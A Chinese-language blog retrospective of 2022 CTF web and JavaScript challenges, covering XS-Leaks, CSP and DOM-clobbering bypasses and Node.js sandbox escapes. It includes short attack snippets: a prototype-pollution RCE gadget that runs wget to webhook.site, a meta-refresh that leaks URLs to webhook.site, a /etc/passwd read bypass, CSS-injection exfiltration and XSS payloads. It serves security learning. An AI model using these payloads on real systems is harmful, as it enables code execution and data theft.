# 2022 年 CTF Web 前端與 JS 題總結 - Huli
今年認真跟著 Water Paddler 打了一整年的 CTF，看到有人整理出了一篇 [CTF: Best Web Challenges 2022](https://blog.arkark.dev/2022/12/17/best-web-challs/)，發現裡面的題目大多數我都有打過，就想說那不如我來寫一篇整理吧，整理一下我自己打過覺得有學到新東西的題目。

因為個人興趣，所以會特別記下來的題目都跟前端與 JS 相關，像是其他有關於後端（PHP、Java 等等）的我就沒記了。

另外，這題有紀錄到的技巧或解法不代表第一次出現在 CTF 上，只是我第一次看到或是覺得值得紀錄，就會寫下來。

我把題目分成幾個類別：

1.  JS 相關知識
2.  Node.js 相關
3.  XSLeaks
4.  前端 DOM/BOM 相關知識
5.  瀏覽器內部運作相關

JS 相關知識
-------

### DiceCTF 2022 - no-cookies

這題的重點在於有一段程式碼的概念大概是這樣：

```js hljs
{
  const pwd = prompt('input password')
  if (!/^[^$']+$/.test(pwd)) return
  document.querySelector('.note').innerHTML = xssPayload
}
```

最後一行你有一個 DOM-based XSS，但你要偷的 pwd 是在 block 裡面，怎麼想都不可能存取到這一段。

而關鍵是那個看似不起眼的 RegExp，有個神奇的屬性叫做 `RegExp.input` 會把上次 test 的東西記起來，因此拿這個就可以拿到 pwd。

詳細 writeup：[https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#webno-cookies5-solves](https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#webno-cookies5-solves)

### PlaidCTF 2022 - YACA

題目核心概念類似這樣（不過我記得是非預期解就是了）：

```js hljs
var tmpl = '<input type="submit" value="{{value}}">'
var value = prompt('your payload')
value = value.replace(/[>"]/g, '')
tmpl = tmpl.replace('{{value}}', value)
document.body.innerHTML = tmpl
```

`>"` 都被取代掉了，看似不可能跳脫出屬性，但重點是 tmpl replace 的參數是可以控制的，此時可以利用 [special replacement pattern](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#specifying_a_string_as_the_replacement) 來找回你的 tag：

```js hljs
var tmpl = '<input type="submit" value="{{value}}">'
var value = "$'<style onload=alert(1) "
value = value.replace(/[>"]/g, '')
tmpl = tmpl.replace('{{value}}', value)
console.log(tmpl)

```

完整 writeup：[https://blog.huli.tw/2022/04/14/javascript-string-regexp-magic/](https://blog.huli.tw/2022/04/14/javascript-string-regexp-magic/)

### ångstromCTF 2022 - CaaSio PSE

簡單來說就是用 `with()` 來繞過不能用 `.` 的限制

完整 writeup：[https://blog.huli.tw/2022/05/05/angstrom-ctf-2022-writeup/#misccaasio-pse](https://blog.huli.tw/2022/05/05/angstrom-ctf-2022-writeup/#misccaasio-pse)

### GoogleCTF 2022 - HORKOS

這題我會稱之為「JS 反序列化」，簡單來說就是 JS 裡面也有一些 magic method，會偷偷被執行到。

例如說你在 async function return 一個東西時，如果這個東西是 Promise，就會先解析完才回傳，所以 `then` 就會偷偷被呼叫到。

同理，一些隱式的型別轉換也會呼叫到 `toString` 或是 `valueOf`，轉成 JSON 時也會呼叫 `toJSON` 之類的。

完整 writeup：[https://blog.huli.tw/2022/07/09/google-ctf-2022-writeup/#horkos-10-solves](https://blog.huli.tw/2022/07/09/google-ctf-2022-writeup/#horkos-10-solves)

### corCTF 2022 - sbxcalc

```js hljs
var p = new Proxy({flag: window.flag || 'flag'}, {
  get: () => 'nope'
})
```

要如何拿到被 Proxy 保護住的原始物件？

答案是 `Object.getOwnPropertyDescriptor(p, 'flag')`

writeup：  
[https://blog.huli.tw/2022/12/08/ctf-js-notes/#corctf-2022-sbxcalc](https://blog.huli.tw/2022/12/08/ctf-js-notes/#corctf-2022-sbxcalc)

Node.js 相關
----------

### DiceCTF 2022 - undefined

這題核心大概是這樣：

```js hljs
Function.prototype.constructor = undefined;
delete global.global;
process = undefined;
{
  let Array=undefined;let __dirname=undefined;let Int8Array=undefined;
  
  
  console.log(eval(input));
}
```

基本上就是先把所有東西變成 `undefined`，最後會用 `eval` 執行你傳進去的程式碼。雖然你可以跑任何東西，但因為所有東西都變成 `undefined` 了，你沒什麼能做的。

解法有三個：

1.  `import()`，這個沒被刪掉
2.  用 `arguments.callee.caller.arguments` 可以拿到上層被覆蓋掉的 arguments（Node.js 自動幫你包的一層）
3.  用 try catch 可以拿到 Error 的 instance

詳細 writeup: [https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#miscundefined55-solves](https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#miscundefined55-solves)

### corCTF 2022 - simplewaf

這題的核心是這樣：

```js hljs
if([req.body, req.headers, req.query].some(
    (item) => item && JSON.stringify(item).includes("flag")
)) {
    return res.send("bad hacker!");
}
res.send(fs.readFileSync(req.query.file || "index.html").toString());
```

你可以控制 `req.query.file` 但是不能包含 `flag` 這個字，目標是讀到 `/app/flag.txt` 這個檔案。

這題需要去看 `fs.readFileSync` 的內部實作，會發現可以傳入一個長得很像 URL instance 的物件，就會用 new URL() 去讀，就可以用 URL encode 繞過了：

```js hljs
const fs = require('fs')

console.log(fs.readFileSync({
  href: 1,
  origin: 1,
  protocol: 'file:',
  hostname: '',
  pathname: '/etc/passw%64'
}).toString())

```

作者 writeup：[https://brycec.me/posts/corctf\_2022\_challenges#simplewaf](https://brycec.me/posts/corctf_2022_challenges#simplewaf)

### Balsn CTF 2022 - 2linenodejs

程式碼核心長這樣：

```js hljs
#!/usr/local/bin/node
process.stdin.setEncoding('utf-8');
process.stdin.on('readable', () => {
  try{
    console.log('HTTP/1.1 200 OK\nContent-Type: text/html\nConnection: Close\n');
    const json = process.stdin.read().match(/\?(.*?)\ /)?.[1],
    obj = JSON.parse(json);
    console.log(`JSON: ${json}, Object:`, require('./index')(obj, {}));
  }catch (e) {
    require('./usage')
  }finally{
    process.exit();
  }
});


module.exports=(O,o) => (
    Object.entries(O).forEach(
        ([K,V])=>Object.entries(V).forEach(
            ([k,v])=>(o[K]=o[K]||{},o[K][k]=v)
        )
    ), o
);
```

有一個很明顯的 prototype pollution，要做到 RCE。

這邊有一篇很棒的論文可以參考：[Silent Spring: Prototype Pollution Leads to Remote Code Execution in Node.js](https://arxiv.org/abs/2207.11171)

但論文裡面提到的 gadget 被修掉了，要自己再找一個，結果如下：

```js hljs
Object.prototype["data"] = {
  exports: {
    ".": "./preinstall.js"
  },
  name: './usage'
}
Object.prototype["path"] = '/opt/yarn-v1.22.19'
Object.prototype.shell = "node"
Object.prototype["npm_config_global"] = 1
Object.prototype.env = {
  "NODE_DEBUG": "console.log(require('child_process').execSync('wget${IFS}https://webhook.site?q=2').toString());process.exit()//",
  "NODE_OPTIONS": "--require=/proc/self/environ"
}

require('./usage.js')
```

細節可以看完整 writeup：[https://blog.huli.tw/2022/12/08/ctf-js-notes#balsn-ctf-2022-2linenodejs](https://blog.huli.tw/2022/12/08/ctf-js-notes#balsn-ctf-2022-2linenodejs)

XSleaks
-------

### DiceCTF 2022 - carrot

這題簡單來說就是利用 [connection pool](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/) 來測量 response time。

你可能會想說測量 response time 有什麼難的，fetch 外加自己算一下不就好了嗎？但如果有 SameSite cookie 的話，fetch 是無法使用的，這時候就需要用到一些 XSleaks 的小技巧來測量時間。

在 Chrome 裡面 socket 數量是有上限的，一般是 255，headless 是 99，假設我們先把 socket 消耗到只剩下一個，這時候我去造訪我想測量時間的 URL（叫做 reqSearch），與此同時發另一個 request 到我們自己的 server（叫做 reqMeasure）。

由於 socket 只剩一個，所以 reqMeasure 從發出 request 到收到 response 的時間，就是 `reqSearch 花的時間 + reqMeasure 花的時間`，假設 reqMeasure 花的時間都差不多，那我們很容易可以測量出 reqSearch 花的時間。

詳細 writeup：[https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#webcarrot1-solves](https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#webcarrot1-solves)

### TSJ CTF 2022 - Nim Notes

這題你可以做到 CRLF injection，但是位置在最底下，所以沒辦法覆蓋 CSP 也無法 XSS，要怎麼偷到頁面的內容？

假設要偷的內容在 `<script>` 裡面，可以利用 [Content-Security-Policy-Report-Only](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy-Report-Only) 這個 header，因為違反規時會發送一段 JSON 到指定位置，其中會包含 scripe 的前 40 個字元。

完整 writeup：[https://blog.huli.tw/2022/03/02/tsj-ctf-2022-nim-notes/](https://blog.huli.tw/2022/03/02/tsj-ctf-2022-nim-notes/)

### ångstromCTF 2022 - Sustenance

有一個搜尋功能，成功跟失敗的差別在於網址不同。

例如說成功是：`/?m=your search...at 1651732982748 has success....`，失敗是：`/?m=your search...at 1651732982748 has failed`

解法兩個，一個是利用 response 會 cache 的這點用 fetch 去測量是否有在 cache 內。雖然說 Chrome 有實裝 Cache parition 了，但是 headless 還沒。

第二個是利用其他 same site domain 做 cookie tossing，就可以構造出一個 cookie bomb，當搜尋成功的時候 payload 會太大（因為網址多了幾個字元），失敗的時候就沒事，藉此測量出差異。

完整 writeup：[https://blog.huli.tw/2022/05/05/angstrom-ctf-2022-writeup/#websustenance](https://blog.huli.tw/2022/05/05/angstrom-ctf-2022-writeup/#websustenance)

### justCTF 2022 - Ninja

新的 xsleak，利用 `:target` 搭配 `:before` 來載入圖片。

細節可參考：[New technique of stealing data using CSS and Scroll-to-Text Fragment feature.](https://www.secforce.com/blog/new-technique-of-stealing-data-using-css-and-scroll-to-text-fragment-feature/)

完整 writeup：[https://blog.huli.tw/2022/06/14/justctf-2022-writeup#ninja1-solves](https://blog.huli.tw/2022/06/14/justctf-2022-writeup#ninja1-solves)

### SekaiCTF 2022 - safelist

利用 lazy-loading image 發 request 給 server 來拖慢 server 速度，就可以藉由 timing attack 得知圖片是否載入。

也可以利用前面提到的 connection pool 或是其他元素來解。

writeup：[https://blog.huli.tw/2022/10/08/sekaictf2022-safelist-and-connection/](https://blog.huli.tw/2022/10/08/sekaictf2022-safelist-and-connection/)

前端 DOM/BOM 相關知識
---------------

### DiceCTF 2022 - shadow

這題的核心在於如何拿到 shadowDOM 裡的東西，更完整的研究在這：[The Closed Shadow DOM](https://blog.ankursundara.com/shadow-dom/)

但總之最後的解法是：

1.  設置 CSS `-webkit-user-modify` 屬性，效果跟 `contenteditable` 差不多
2.  用 `window.find` 去 docus 內容
3.  利用 `document.execCommand` 插入 HTML，並用 svg 拿到節點

詳細 writeup：[https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#webshadow0-solves](https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/#webshadow0-solves)

### LINE CTF 2022 - Haribote Secure Note

這題有兩個注入點，第一個在 script 裡面，可以控制 16 個字元，第二個則是 HTML injection，而最大的問題是 CSP 很嚴格：

```html hljs
<meta content="default-src 'self'; style-src 'unsafe-inline'; object-src 'none'; base-uri 'none'; script-src 'nonce-{{ csp_nonce }}'
    'unsafe-inline'; require-trusted-types-for 'script'; trusted-types default"
          http-equiv="Content-Security-Policy">
```

解法有三個：

1.  神奇的 [script data double escaped state](https://www.w3.org/TR/2011/WD-html5-20110405/tokenization.html#script-data-double-escaped-state)
2.  `import()` 不會被 Trusted Types 擋住
3.  用 `<iframe src='/p'>` 在其他頁面執行程式碼繞過 CSP

順便附上一篇很棒的文章：[Eliminating XSS from WebUI with Trusted Types](https://microsoftedge.github.io/edgevr/posts/eliminating-xss-with-trusted-types)

完整 writeup：[https://blog.huli.tw/2022/03/27/linectf-2022-writeup/#haribote-secure-note7-solves](https://blog.huli.tw/2022/03/27/linectf-2022-writeup/#haribote-secure-note7-solves)

### m0leCon CTF 2022 - ptMD

利用 `meta` 組合技洩漏網址：

```html hljs
<meta name="referrer" content="unsafe-url" />
<meta http-equiv="refresh" content="3;url=https://webhook.site/d485f13a-fd8b-4cfd-ad13-63d9b0f1f5ef" />
```

在 CSP 很嚴格的狀態下，meta 可以作為一個突破的技巧。像上面這些 meta 不用放在 head 裡面也有作用，甚至移除掉之後也有用。

完整 writeup：[https://blog.huli.tw/2022/05/21/m0lecon-ctf-2022-writeup#ptmd](https://blog.huli.tw/2022/05/21/m0lecon-ctf-2022-writeup#ptmd)

### corCTF 2022 - modernblog

這題是一個 React app，會用 `dangerouslySetInnerHTML` render 你的東西，也就是說你得到一個 HTML injection。

但 CSP 不讓你執行 script：`script-src 'self'; object-src 'none'; base-uri 'none';`

你要偷的是有 flag ID 的網址，這個網址會出現在 `/home` 頁面，如果我們可以在那個頁面做 CSS injection，就可以這樣偷：

```hljs
a[href^="/post/0"] {
  background: url(//myserver?c=0);
}

a[href^="/post/1"] {
  background: url(//myserver?c=1);
}

// ...
```

而我們現在在的是 `/posts/:id` 頁面，所以沒辦法拿到 `/home` 頁面的內容，自然也就不能這樣做。

這題的關鍵點是一個很有趣的 DOM clobbering 應用，現在 React app 基本上都是用 [react-router](https://reactrouter.com/en/main) 這個 lib 來做路由的，這個 lib 裡面會去拿 `document.defaultView.history`，去看網址是什麼，來決定 render 哪個頁面。

而 `document.defaultView` 可以被 DOM clobbering 影響，像這樣：

```html hljs
<iframe name=defaultView src=/home></iframe>
```

如此一來，`document.defaultView.history` 就變成了 `/home`，因此，我們只要用 iframe srcdoc 就可以在 React app 裡面再渲染一個 React app，並且用前面提過的 CSS injection 把 flag id 拿出來：

```html hljs
<iframe srcdoc="
  <iframe name=defaultView src=/home></iframe><br>
  <style>
    a[href^="/post/0"] {
      background: url(//myserver?c=0);
    }

    a[href^="/post/1"] {
      background: url(//myserver?c=1);
    }
  
  </style>

  react app below<br>
  <div id=root></div>
  <script type=module crossorigin src=/assets/index.7352e15a.js></script>
" height="1000px" width="500px"></iframe>
```

我之前寫過的英文 writeup：[https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/](https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/)

### HITCON CTF 2022 - Self Destruct Message

原本在用 `element.innerHTML = str` 的時候都是非同步的，但利用神奇的 `<svg><svg>` 即可做到同步：

```html hljs
const div = document.createElement('div')
div.innerHTML = '<svg><svg onload=console.log(1)>'
console.log(2)
```

會先輸出 1 再來 2，而且不用插到 DOM 就會生效。

相關討論可以看：[https://twitter.com/terjanq/status/1421093136022048775](https://twitter.com/terjanq/status/1421093136022048775)

writeup：[https://blog.huli.tw/2022/12/08/ctf-js-notes/#hitcon-ctf-2022](https://blog.huli.tw/2022/12/08/ctf-js-notes/#hitcon-ctf-2022)

### SekaiCTF 2022 - Obligatory Calc

兩個重點：

1.  onmessage 裡面的 `e.source` 是發送訊息的來源 window，雖然乍看之下一定是物件，但如果 postMessage 之後立刻關閉，就會變成 null
2.  在 sandbox iframe 底下，存取 `document.cookie` 會發生錯誤

瀏覽器內部運作相關
---------

### GoogleCTF 2022 - POSTVIEWER

這題跟瀏覽器在執行東西時的順序有關，也跟 site isolation 之類的有關，透過這些東西就可以構造出一個 iframe 相關的 race condition。

完整 writeup：[https://blog.huli.tw/2022/07/09/google-ctf-2022-writeup/#postviewer-10-solves](https://blog.huli.tw/2022/07/09/google-ctf-2022-writeup/#postviewer-10-solves)

### UIUCTF 2022 - modernism

程式碼很簡單：

```py hljs
from flask import Flask, Response, request
app = Flask(__name__)

@app.route('/')
def index():
    prefix = bytes.fromhex(request.args.get("p", default="", type=str))
    flag = request.cookies.get("FLAG", default="uiuctf{FAKEFLAG}").encode() 
    return Response(prefix+flag, mimetype="text/plain")
```

把你給的東西加上 flag 之後輸出，雖然 mime type 是 `text/plain`，但因為沒有加上 `X-Content-Type-Options: nosniff`，所以還是可以用 `<script>` 來載入這一段。

但因為 flag 裡面有 `{}` 所以沒辦法輕易弄成可以被執行的腳本（會一直出現 syntax error）

解法是前面加上 BOM，瀏覽器就會把整個腳本用 UTF-16 去讀，flag 就會變奇怪的中文字就不會壞了，要放的內容是 `++window.`，接著去看 window 的哪個屬性被改變就好了。

這題的解法基本上要知道瀏覽器怎麼去讀才能解。

完整 writeup：[https://blog.huli.tw/2022/08/01/uiuctf-2022-writeup/](https://blog.huli.tw/2022/08/01/uiuctf-2022-writeup/)

### UIUCTF 2022 - precisionism

上一題的延伸，只是結尾加上了`Enjoy your flag!`，因為這個結尾所以上面提過的招數不能用了。

預期解法是把 response 弄成 ICO 格式，把要 leak 的部分放到 width 去，然後 cross origin 拿圖片寬度是可以的，就可以一個 byte 一個 byte 把資料拿出來。

完整 writeup：[https://blog.huli.tw/2022/08/01/uiuctf-2022-writeup#precisionism3-solves](https://blog.huli.tw/2022/08/01/uiuctf-2022-writeup#precisionism3-solves)

### SECCON CTF 2022 Quals - spanote

這題利用了 bfcache 這個東西：[https://web.dev/i18n/en/bfcache/](https://web.dev/i18n/en/bfcache/)

假設有個 API 長這樣：

```js hljs
fastify.get("/api/notes/:noteId", async (request, reply) => {
  const user = new User(request.session.userId);
  if (request.headers["x-token"] !== hash(user.id)) {
    throw new Error("Invalid token");
  }
  const noteId = validate(request.params.noteId);
  return user.sendNote(reply, noteId);
});
```

雖然是個 GET，但是會檢查 custom header，因此照理來說直接用瀏覽器訪問是看不了的。

但利用 bfcache，可以這樣解：

1.  用瀏覽器打開 `/api/notes/id`，出現錯誤畫面
2.  用同一個 tab 去到首頁，此時首頁會用 fetch 搭配 custom header 去抓 `/api/notes/id`，瀏覽器會把結果存在 disk cache 內
3.  上一頁，此時畫面會顯示 disk cache 的結果

就可以用瀏覽器直接瀏覽 cached response，繞過了 custom header 的限制。

完整 writeup：[https://blog.huli.tw/2022/12/08/ctf-js-notes/#seccon-ctf-2022-quals-spanote](https://blog.huli.tw/2022/12/08/ctf-js-notes/#seccon-ctf-2022-quals-spanote)

特別加映：人物介紹
---------

原本就有幾個人令我印象特別深刻，想說既然都整理了題目，順便整理一下這些人好了。

第一位是 [Ankur Sundara](https://twitter.com/ankursundara)，隸屬於 dicegang 戰隊，上面 UIUCTF 的題目是他出的，之前解了一題跟 content type 有關的題目也是他出的，感覺應該是把 Chromium source code 相關部分看了一遍才產出那些題目。

另外這篇對 Shadow DOM 的研究也是他寫的：[The Closed Shadow DOM](https://blog.ankursundara.com/shadow-dom/)

第二位是 [terjanq](https://twitter.com/terjanq)，在 Google 上班，上面講到的 GoogleCTF race condition 那題是他出的，以前也出過一堆經典題目，XSleak wiki 是他維護的，總覺得在跟瀏覽器有關的行為這塊沒什麼他不會的…

偶爾會跟著 justCatTheFish 戰隊一起打 CTF，如果有些前端 Web 題只有一兩隊解出來，高機率 justCatTheFish 是其中一隊。

第三位是 [strellic](https://twitter.com/Strellic_)，也來自於 dicegang，出了一堆題目而且品質都很好，writeup 也寫得很詳細，從他那邊學到很多技巧跟新的想法，總是能結合以前的技巧然後發展出新的手法，真的很厲害。

除了這些當然還有其他印象深刻的人，但就懶得一一介紹了XD

像是開頭提到的文章作者 [@arkark_](https://twitter.com/arkark_)、出了讓我到現在還驚艷的一題的 [@zwad3](https://twitter.com/zwad3)、解出難題的常客 [@parrot409](https://twitter.com/parrot409) 以及 [@maple3142](https://twitter.com/maple3142)，都很常看到他們活躍在 CTF 中。

總結
--

整理過後發現自己還打過滿多題目的（雖然很多都沒解出來就是了），而有些題目雖然概念不難，但要實作起來也是滿麻煩的。

另外，可以發現有不少題目需要去看到 lib 的 source code 才有辦法解，我個人是滿喜歡這種題目的，就有種 real world 的感覺吧，平時在用的東西但你其實不知道它背後是怎麼運作的，藉由 CTF 強迫你去理解它。雖然與 Web 無關，但今年也出現了兩三次跟 Git 有關的題目，也都是需要去理解 Git 背後的運作才能解。

今年學到了很多以前完全不知道的技巧，覺得自己對於 JS 跟瀏覽器的理解又上升了一點，但可以預見的是明年一定還是被電，還是會出現更多以前不知道的東西。

最後也要感謝一下每個出題者，是因為有這些出題者藉由題目分享自己的研究，才能讓其他人學到這些新穎的技巧。我自己認為出一個好的題目比解題還要難，解題的話你知道一定會有答案在那邊，只要找到答案就好。而出題如果要出的好，你要自己先去發現一個新的東西，這個真的難，再次對每個出題者致上敬意。